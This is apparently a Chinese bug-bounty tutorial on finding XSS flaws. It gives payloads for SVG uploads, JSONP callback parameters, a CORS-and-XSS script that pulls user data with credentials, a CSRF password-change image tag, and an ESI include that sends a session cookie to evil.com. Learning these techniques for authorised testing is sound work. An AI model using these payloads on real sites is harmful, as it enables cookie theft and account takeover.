#  XSS漏洞挖掘上   
 GG安全   2025-02-08 05:53  
  
**免责声明**  
  
由于传播、利用本公众号红云谈安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号红云谈安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！本文为连载文章欢迎大家关注红云谈安全公众号！  
  
# XSS漏洞挖掘  
  
XSS漏洞最简单的理解就是将我们输入的内容解析为HTML  
  
像下面的案例就不存在xss漏洞，因为你看img标签和p标签的颜色是不一致的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNng8zq2UD6ibwwTababUrIWL4qFFdR1Ycf46iaeImlpxpreT1LPohAH16w/640?wx_fmt=png "")  
  
当img标签和其他标签颜色一样时说明将我们输入的内容当成HTML进行解析了![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNn9RlvibzGgaCa16uNicoibVzv7JA6mujzBGOibiaTKTWoWM9eVz6vVDic4ialw/640?wx_fmt=png "")  
  
  
看见输入框就直接输入XSS语句，第一开始最好就是使用img标签，经过多年的经验一般img标签拦得比较少，如果确认有XSS漏洞，有WAF的话就直接绕啦，XSS漏洞中的很多WAF都可以绕过，只要<>这个符号没有给拦那么基本上都能绕过。  
## 文件上传点  
  
**方式一**  
  
上传一张含有xss语句的图片，更改上传类型![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnEqoNMibdPicryiajsJFE1yzcuPKpW5icdNQfK1E5OnWJECQBVVeiawXXhqQ/640?wx_fmt=png "")  
  
  
**方式二**  
  
在图片后面添加HTML很有可能会实现绕过![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnIT1Bp4n01Uf0gzuCYxpE2tOoloBmq6EFmwY5BOezvjzMwqdL4yKTmw/640?wx_fmt=png "")  
如果上传到的域名是在云服务器上的话，且能够上传任意文件，那建议更改漏洞名称以另外一种形式进行提交，因为我已这样的漏洞交过很多次，都是给忽略，而另外一种形式交很多都是中危或者高危！后续在文件上传漏洞在讲吧!  
  
**方式三**  
  
除了传统的JPG图片外很多服务器也支持上传svg格式的图片。上传一个xss payload的svg格式图片 payload如下：  
```
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">   <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />   <script>alert(1)</script></svg>
```  
## 寻找可控参数  
  
在数据包的抓取过程中观察是否有可控参数，并且查看返回保定的返回Content-Type类型是不是text/html类型，如果这两个条件满足就说明极其有可能存在漏洞。  
  
看下面案列，你看callback参数，我们输入的内容返回包中全部显现出来，说明参数可控，并且返回类型为text/html![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnOHgbzgKnuhkzNzZcdhibO2DE4iccUmdkZQVseYPLQoSrmsBomiblV2hZQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnCuia0IONuHoKvkBKHeuke3jVIcibkYlibhVLN4LazH4sTBl2wzp4Nq52w/640?wx_fmt=png "")  
  
直接输入img标签，解析为html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnogjXrfk3anOXSnibVWKkwcCgbSBqhJnCjzEJY5UTqUnNibicDI3PqwDQQ/640?wx_fmt=png "")  
说明存在反射xss漏洞，有WAF但几下就绕过了（后续会写一篇专门关于XSS WAF绕过的文章）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnr34EJKB6vA6Kju09JYB3v3PGNYWODgbETAkdg2ibD94XG65PvwV5jVw/640?wx_fmt=png "")  
  
下面是常见的可控参数  
```
_callback=11_cb=11callback=11cb=11jsonp=11jsonpcallback=11jsonpcb=11jsonp_cb=11json=11jsoncallback=11jcb=11call=11callBack=11jsonpCallback=11jsonpCb=11jsonp_Cb=11jsonCallback=11ca=11callBackMethod=11
```  
## 审计  
  
就是要看html源码，从源码里面找出可能反射的参数，看看下面，var terms_style：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnLJotScXWsXXwicgWyc9bv1U6mMusF8ulvhfmJdjAkTKCt1UCgicRBzDA/640?wx_fmt=png "")  
  
就是把它变成url的参数，terms_style， terms， style， term， 你能猜出来算我输。没错， 是style~  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnv7n0EufHXkDHBkunZIRpBicib2Sg3IQP3a7Vegib1qZrtsf5h5PF1udWA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnJeUvkIQqAslADDrax73yXJQjyxiacxTU3Qy1selSyo5xHZtLbYDD4uA/640?wx_fmt=png "")  
先轻轻地注入” 符号，很好啊，没转义，没过滤，接下来就是直接输入XSS语句不多说了，关键就是寻找可控参数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnSo1CE1HiaDwKgegVLSQtmRkcOMkjSg257CCftGGav6BDkj21RsT3vGA/640?wx_fmt=png "")  
  
参考文章：https://mp.weixin.qq.com/s/RCebgSJLrucJ71KiZe22DQ  
## 骚操作  
  
这是在一个旁站挖到的XSS漏洞（旁站漏洞给的赏金比较少）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNn0y554CCpGTlX9VsiaOPawH85QJUPYQQY55lwMIBFg7yiciaabw5F2cpUA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnT7pbr135tVoM1Tcqgiaexjj1Y7ibn8I4ABg0YnUgMY8S3C3URKbOsvpA/640?wx_fmt=png "")  
成功弹出cookie、并且我f12查看发现bbb.xxx.com这个域名的cookie、和aaaa.xxx.com主站的cookie是一样的、只要盗取bbb.xxx.com的cookie就相当于获取主站的cookie信息（aaa这个域名是打个比方引用）如果是这样的情况在漏洞提交的时候可以说明  
### 危害加大  
  
在创建工单这有图片上传点，但却没有存储XSS漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnA6icNGHROSVVpdWQRANUGKNzUOUsmo4aEalufkJyxfpVjAJOfua5zeQ/640?wx_fmt=png "")  
  
上传一张图片并抓包![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNng1YBltTvKzsnyhZXEibmBfDddSKcG7FicMPfic7DM4OgHaolLL4oUDn2g/640?wx_fmt=png "")  
  
  
在上传数据包的过程中该数据包的URL引起了我的注意，如果我将URL信息替换为上面文件上传导致的存储xss的链接，是否能够实现替换  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNn9hhcnKPGC15uGjTU8y4eC8HhcLIJnzc1jicoA9ic29zHroGsm2yLwYRg/640?wx_fmt=png "")  
  
成功变为包含存储XSS的图片链接![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnumDkdjbXqCoWv75RC5YP822WVIe9vwC6LGrBFETccuGWcVLkH7oibWA/640?wx_fmt=png "")  
不出所料，发送成功后打到了管理员的cookie  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnZzMzYibbJoVzlGVlumJ03yyfHUzD6Jw0eEkotkUzUzapt3WF7FYlmlA/640?wx_fmt=png "")  
## CORS和XSS漏洞组合拳  
  
首先挖到一个反射xss漏洞![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnv2pkP0FwEVGyj9UrLiaVOZUT4lwasfj7YxibJiaBl8FGDiaxasyAvI30Hw/640?wx_fmt=png "")  
同时在另外一个域名下发现CORS漏洞，该接口能够获取用户身份量信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnic6ibJjOcGy5KDmPrteNnbVddkV0QjMpbJceibOibWve2QU8uHiafiahOVBw/640?wx_fmt=png "")  
  
修改为任意源发现直接拒绝  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNndVc0R2icD0m9KeBjG1UPoVVhpV5VQrPL7FibEGGKV1f2iaTTxq6h1B4WQ/640?wx_fmt=png "")  
  
然后我再加上子域名就可以了、说明没有验证严谨、任何子域名都是允许源，在配合子域名的xss即可。![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnrfXgCHunpIIicaIrR4iab4sNlvhcsLK42e6y8KMjiawNXkY5pAUbBb58w/640?wx_fmt=png "")  
直接写脚本脚本如下：  
```
https://www.xxx.com/script/buyer/epay?callback=<script>var http = new XMLHttpRequest(); var url = 'https://www.bbb.com/user/address/getUserAllAddress.json?_=1647180520575'; var params = ''; http.open('GET', url, true); http.setRequestHeader("Content-type","application/json;charset=UTF-8"); http.withCredentials = true; http.onreadystatechange = function() {if(http.readyState == 4 && http.status == 200) {   alert(http.responseText);  } } http.send();</script>
```  
  
（以后使用的时候只要将给的链接替换成存在漏洞的链接即可）组合成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnSLXexzb7hJnbFOgUQ9zGRd7xu3FvCOy94XYHQmGUkctAyTG0hHr3UQ/640?wx_fmt=png "")  
## CSRF和XSS漏洞组合拳  
  
CSRF和XSS漏洞的组合拳，需要一个XSS比如在留言处、内容发布处，一个敏感操作的CSRF如密码修改处、个人信息修改处。在受害者访问存在xss漏洞的过程中，就能够直接造成CSRF漏洞来进行密码修改。看以下案列：直接访问修改密码URL 将难度调至Low级别，我们把在CSRF中修改密码后的URL复制下来  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnYAibObdSCicowmkjaA8MnicnCJM9iamoSjXgJsbEcpIR7FOHaQlicXWnG9g/640?wx_fmt=png "")  
到XSS(Stored)中将复制到的网址粘贴到Message中，使用img标签构造语句，若文本框限制字符长度，就在页面代码中修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnL92JjoIo1ePfTycUCWDawY5sEACK7taUBAq5XCFd72Hh3et9qFCT0Q/640?wx_fmt=png "")  
当受害者访问该存在xss漏洞的地方处，服务器就会自动加载img标签中的链接，该链接就是CSRF链接从而造成密码修改高危操作，其实这在实战中还是经常遇到的啦。<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=444&password_conf=444&Change=Change">  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnx5ntPu8CeUt3G0vWiaySWgPRgR8WP7ibZZeQYrepJhCfzmlRiauzhzU3A/640?wx_fmt=png "")  
  
## 绕过HTTPOnly Cookie  
  
按照设计，HTTP代理（如代理和负载均衡器）可以访问完整的HTTP请求和响应。这包括浏览器或服务器发送的所有cookie。ESI规范的一个有用功能是能够访问ESI标签内传输的cookie。这允许开发人员在ESI引擎中使用cookie，通过利用cookie给予开发人员更大的灵活性。  
  
正是这个有用的功能提供一个重要的攻击媒介：cookie外带（cookie exfiltration）通过JavaScript引擎对cookie进行窃取的一个已知策略是使用HTTPOnly。它在创建Cookie时指定，将拒绝JavaScript引擎访问cookie及其值的能力，从而防止XSS攻击窃取cookie。由于ESI是在服务器端进行处理的，因此可以在从上游服务器到代理的过程中使用这些cookie。一个攻击媒介将使用ESI include通过其URL来外带cookie。想象一下ESI引擎正在处理以下payload：  
  
<esi:include src="http://evil.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />  
  
这时我们在evil.com主机的HTTP访问日志中就可以看到：  
  
127.0.0.1 evil.com - [08/Mar/2018:15:20:44 - 0500] "GET /?cookie=bf2fa962b7889ed8869cadaba282 HTTP/1.1" 200 2 "-" "-"  
  
这样，HTTPOnly cookies可以在没有Javascript的情况下被窃取。  
  
参考文章：https://www.anquanke.com/post/id/103641#h3-5  
## 不一样的XSS  
  
上传一张图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnrXOmlcwpFxzNBOecfEet8ibBkC8JOLK5LToNLQ6282frocEAkicRbKgQ/640?wx_fmt=png "")  
点击上传一张图片、抓取上传图片数据包的返回包，也就是这个数据包的返回包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNn4B9ic5WLWodcnHKBSqkkWQMT9aliaMxOc2NFSiaKH4fdeszgcrpACr1Tg/640?wx_fmt=png "")  
返回包如下：![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNn436VghR8LFiaOrg8yVzNsicXV8FVch4UBicPX9iaCkt72BTP2NMwZxicHpg/640?wx_fmt=png "")  
修改fileId参数值为：  
  
1\u0022 onerror=alert(1) \u0022  
  
成功弹窗，并且刷新页面还是可以继续弹窗，这边问了客服也会弹窗，说明不是self-xss，而是存储xss  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnZgov0UXbJR5iagZMTBxTasnewrUkjUfOBlAIVteGbZtIv8FhgSiao6OQ/640?wx_fmt=png "")  
  
原理是我们在上传图片的时候图片本身有一个img标签，我利用这个img标签给修改成弹窗，并内嵌进去了如下：![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMGQUdrK79MGwKt4nsy50NNnoz4bvFDXKJCNwuhicqNAArkDpZN1IIcDRMqafgOPiab522pzSVRwAJGg/640?wx_fmt=png "")  
在几乎所有的漏洞挖掘过程中基本就是寻找可控参数来挖掘，XSS漏洞也不例外，所以平常漏洞挖掘过程中最主要的还是理解业务功能、观察数据包。  
  
**1**  
►  
  
**福利放送**  
  
    再次声明：本公众号及其发布的内容的使用者需自行承担由此产生的任何直接或间接的后果和损失，GG安全公众号和原文章作者不承担任何责任。  
  
****  
**edusrc邀请码 | 玄机邀请码**  
  
    免费不限量提供edusrc邀请码及  
玄机邀请码  
，可在的菜单栏  
资源获取-edusrc邀请码   
| 玄机邀请码  
中获取。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia30l0vOygMG0stgMGrb9qOt6icialDd5WP60Tuk8mdKsbAHGHRgZpIrV0yUN479hWrFTa8NoPEumPTP3h3bO4iaWQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**2**  
►  
  
**往期精彩**  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509586&idx=1&sn=c33b1b3ce59fa2fc523f6b062df185eb&chksm=c09ad502f7ed5c14486802007f8f59ba055137028c3f0a7ebe42547647ab3059ce2a0fea5a21&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509586&idx=1&sn=c33b1b3ce59fa2fc523f6b062df185eb&chksm=c09ad502f7ed5c14486802007f8f59ba055137028c3f0a7ebe42547647ab3059ce2a0fea5a21&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509586&idx=1&sn=c33b1b3ce59fa2fc523f6b062df185eb&chksm=c09ad502f7ed5c14486802007f8f59ba055137028c3f0a7ebe42547647ab3059ce2a0fea5a21&scene=21#wechat_redirect)  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247485283&idx=1&sn=d26389e1d4ace54a43b2b2c893a474b6&scene=21#wechat_redirect)  
  
Edusrc高校证书测评  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247485141&idx=1&sn=ffcd2813da3458253b630dfeb9fbe581&scene=21#wechat_redirect)  
  
绝版乌云重现：在VM中复活的安全宝藏  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247509558&idx=1&sn=4ed77b8fbe43290b3fb889465673e9a3&chksm=c09ad566f7ed5c70d7aba88f9aaf96b07004f382627a0f119dd22fe51bd893d3aece18f3917f&scene=21#wechat_redirect)  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247484834&idx=1&sn=f5c5d3ca80704c6fcc466f7c24bd71d5&scene=21#wechat_redirect)  
  
钓鱼佬永不空军！社g之学姐送我“严重”漏洞  
  
  
  
  
